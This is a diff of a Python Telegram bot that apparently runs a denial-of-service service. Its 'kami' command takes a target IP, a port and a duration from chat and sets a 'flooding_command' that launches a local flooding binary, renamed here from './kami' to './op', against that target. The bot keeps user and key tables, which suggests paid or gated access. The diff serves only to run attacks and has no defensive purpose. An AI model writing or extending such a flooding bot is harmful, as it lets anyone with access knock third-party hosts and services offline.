@@ -21,8 +21,6 @@ flooding_process = None
 flooding_command = None
 
 
-DEFAULT_THREADS = 20
-
 
 users = {}
 keys = {}
@@ -157,8 +155,8 @@ async def kami(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./kami', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
+    flooding_command = ['./op', target_ip, port, duration]
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds.')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
